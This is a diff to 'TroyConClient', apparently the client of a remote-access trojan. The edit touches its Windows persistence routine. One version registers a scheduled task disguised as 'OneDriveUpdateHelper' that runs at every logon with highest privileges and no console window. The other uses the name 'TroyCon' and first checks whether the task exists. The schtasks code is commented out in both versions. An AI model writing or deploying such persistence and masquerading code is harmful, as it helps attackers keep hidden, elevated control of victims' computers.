@@ -208,15 +208,23 @@ class TroyConClient:
                 # print("Registry Run key registration complete")
 
                 # Register to Task Scheduler
-                # Task Name: "OneDriveUpdateHelper" (Masquerading as a legitimate service)
-                # Trigger: /sc onlogon (Runs every time the user logs in)
-                # Force: /f (Overwrite if exists)
-                # task_name = "OneDriveUpdateHelper"
-                # cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl HIGHEST /f'
-                
-                # Execute command in the background without a console window
-                # subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-                # print(f"[Persistence] Registered to Task Scheduler as '{task_name}'.")
+                # task_name = "TroyCon" # Task name for masquerading (Disguise)
+
+                # Check if the task is already registered
+                # check_cmd = f'schtasks /query /tn "{task_name}"'
+                # check_result = subprocess.run(check_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                # if check_result.returncode != 0:
+                    # print(f"[*] Starting Task Scheduler registration: {task_name}")
+
+                    # /rl HIGHEST: Run with highest privileges (Admin rights)
+                    # /sc onlogon: Run automatically on user logon
+                    # cmd = f'schtasks /create /tn "{task_name}" /tr "\\"{exe_path}\\"" /sc onlogon /rl HIGHEST /f'
+                    
+                    # Execute command in the background without a console window
+                    # subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                    # print(f"[Persistence] Registered to Task Scheduler as '{task_name}'.")
+                # else:
+                    # print(f"[Persistence] Task is already registered in the Scheduler.")
 
             except Exception as e:
                 print(f"[Error] Final persistence setup failed: {e}")
